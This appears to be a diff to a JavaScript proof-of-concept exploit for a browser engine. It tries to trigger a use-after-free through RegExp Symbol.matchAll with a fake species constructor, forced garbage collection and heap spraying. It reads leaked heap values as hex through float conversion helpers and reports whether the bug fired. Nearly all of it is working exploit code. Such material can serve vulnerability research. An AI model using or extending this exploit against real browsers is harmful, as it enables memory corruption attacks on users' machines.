@@ -7,11 +7,14 @@ function w2f(lo,hi){u[0]=lo>>>0;u[1]=hi>>>0;return c[0];}
 function f2s(f){c[0]=f;return (u[1]>>>0).toString(16)+':'+(u[0]>>>0).toString(16);}
 const MARK = w2f(0x13371337, 0x41414141);
 const MARK2 = w2f(0xdeadbeef, 0xcafebabe);
-function gcOnce(){
-  // allocate young garbage until a fresh canary is collected == one scavenge observed
+const tick = () => new Promise(r => setTimeout(r, 0));
+async function gcOnce(){
   const wr = new WeakRef({});
   let n = 0;
-  while (wr.deref() !== undefined && n < 4000) { new Array(0x400).fill(1.1); n++; }
+  while (wr.deref() !== undefined && n < 3000) {
+    new Array(0x400).fill(1.1); n++;
+    if ((n & 31) === 0) await tick();   // end job -> keep-alive expires
+  }
   return n;
 }
 function spray(k){
@@ -19,29 +22,28 @@ function spray(k){
 }
 async function main(){
   out('START');
-  out('FULL ' + navigator.userAgent);
+  out('UA ' + navigator.userAgent);
   const samples = [];
   for (let round = 0; round < 3; round++) {
     try {
       const re = /(?:)/;
-      gcOnce(); gcOnce();                 // promote re to old space
-      gcOnce();                           // align: fresh to-space, bump ptr at base
+      const p1 = await gcOnce(); await gcOnce();      // promote re
+      await gcOnce();                                  // align: fresh to-space
       const fake = { flags: "g", lastIndex: 1073741823,
         constructor: {[Symbol.species]: function() { return re }} };
-      RegExp.prototype[Symbol.matchAll].call(fake, "").next();   // H lands at low offset
+      RegExp.prototype[Symbol.matchAll].call(fake, "").next();
       const t0 = String(re.lastIndex);
-      gcOnce(); gcOnce();                 // two flips: H's space dead -> active again
-      spray(2);                           // first young allocations cover H's slot
+      await gcOnce(); await gcOnce();                  // two flips
+      spray(2);
       const s1 = String(re.lastIndex);
       const s1hex = f2s(re.lastIndex);
-      re.lastIndex = 0;                   // CLEANUP: kill the dangling field
-      const s2 = String(re.lastIndex);
-      samples.push({t0, s1, s1hex, cleaned: s2 === '0'});
-      out('R'+round+' '+JSON.stringify(samples[round]));
+      re.lastIndex = 0;                                // cleanup dangling field
+      samples.push({t0, s1, s1hex});
+      out('R'+round+' '+JSON.stringify(samples[round])+' gcN='+p1);
     } catch(e) { out('R'+round+' ERR '+(e&&e.message?e.message:e)); }
   }
   const uaf = samples.some(s => s.s1 !== '1073741824');
-  out('VERDICT ' + JSON.stringify({uaf, rounds: samples.length}));
+  out('VERDICT '+JSON.stringify({uaf})+' rounds='+samples.length);
   out('SURG_DONE');
 }
 main();
